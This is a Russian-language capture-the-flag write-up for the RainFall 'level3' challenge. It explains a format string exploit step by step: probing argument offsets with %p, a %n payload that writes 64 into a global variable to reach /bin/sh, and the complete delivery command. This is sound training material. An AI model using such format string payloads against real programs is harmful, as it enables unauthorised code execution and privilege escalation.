# Level 3 - форматная строка #1

### 1. Реверсим бинарь и замечаем неправильное использование функции printf
	Если мы можем контролировать форматную строку, то можем и писать практически в любую память что захотим.
	Чтобы вызвать /bin/sh нам необходимо записать в глобальную переменную m значение 64

### 2. Вычисляем, какой аргумент (%1, %2, %3 ... ) мы контролируем
    Для этого засылаем строку вида ABCD%p-%p-%p-%p-%p-%p-%p-%p и отсчитываем, на какой позиции появится строка ABCD. В моем случае это был 5-ый аргумент

```dart
level3@RainFall:~$ ./level3
ABCD%p-%p-%p-%p-%p-%p-%p-%p
ABCD0x200-0xb7fd1ac0-0xb7ff37d0-0x44434241-0x252d7025-0x70252d70-0x2d70252d-0x252d7025
```

### 3. Формируем форматную строку, нам нужно учитывать сдвиг по 4-х байтной границе.
    Нам нужно записать число 64, для этого используем спецификатор %n, который записывает в указанный адрес число напечатанных байт. Адрес  глобальной переменной m берем из бинаря, он не изменится с новым запуском программы. Получается строка:
    %64x%6$n\x8c\x98\x04\x08
    %64x просто напечатает 64 пробела (возможно и другие символы, главное что 64), %6$n значит берем 6 аргумент (на месте 5-ого аргумента сейчас строка %64x) и записываем в него количество напечатанных байт (%n), затем следует адрес глобальной переменной (это и есть 6-ой аргумент).
    
### 4. Засылаем в бинарь
    (echo -e '%64x%6$n\x8c\x98\x04\x08'; cat) | ./level3